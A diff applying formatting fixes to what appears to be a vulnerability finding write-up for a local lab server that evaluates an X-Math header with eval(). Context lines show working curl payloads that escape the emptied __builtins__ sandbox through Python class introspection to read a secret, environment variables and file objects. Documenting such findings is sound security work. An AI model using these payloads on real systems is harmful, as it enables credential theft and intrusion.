@@ -23,6 +23,7 @@ uv run python doc/finding_1/server.py
 ```
 
 The server will start on port 8000 and display:
+
 ```
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.1.4:8000
@@ -60,7 +61,7 @@ While the code attempts to restrict access by emptying `__builtins__`, this can 
 First, verify the eval() functionality works:
 
 ```bash
-curl -H "X-Math: 2+2" http://localhost:8000
+curl -v -H "X-Math: 2+2" http://localhost:8000
 ```
 
 **Expected Response**: `X-Math: 4` in the response headers.
@@ -100,12 +101,12 @@ curl -v -H "X-Math: [x for x in (1).__class__.__mro__[1].__subclasses__() if x._
 ### The Attack Chain
 
 1. **Class Introspection**: `(1).__class__` gets the `int` class
-2. **Method Resolution Order**: `.__mro__[1]` gets the `object` base class  
+2. **Method Resolution Order**: `.__mro__[1]` gets the `object` base class
 3. **Subclass Discovery**: `.__subclasses__()` lists all classes inheriting from `object`
 4. **Filter Target**: Find the `Config` class by name
 5. **Attribute Access**: Directly access `Config.Auth` to extract the secret
 
-### Why __builtins__ Restriction Failed
+### Why **builtins** Restriction Failed
 
 The `{"__builtins__": {}}` restriction only prevents direct access to built-in functions like `open()`, `exec()`, etc. However, it doesn't prevent:
 
@@ -141,7 +142,7 @@ This object becomes accessible through Python's class system, even with restrict
 In production environments, this vulnerability could lead to:
 
 - Database credential theft
-- API key extraction  
+- API key extraction
 - Session token compromise
 - Internal system access
 - Complete application takeover
@@ -157,12 +158,14 @@ In production environments, this vulnerability could lead to:
 ## Example Attack Variations
 
 ### Access Environment Variables
+
 ```bash
 curl -H "X-Math: [x for x in (1).__class__.__mro__[1].__subclasses__() if 'os' in x.__module__][0]._os.environ" http://localhost:8000
 ```
 
 ### File System Access (if available)
-```bash  
+
+```bash
 curl -H "X-Math: [x for x in (1).__class__.__mro__[1].__subclasses__() if x.__name__ == 'TextIOWrapper'][0]" http://localhost:8000
 ```
 
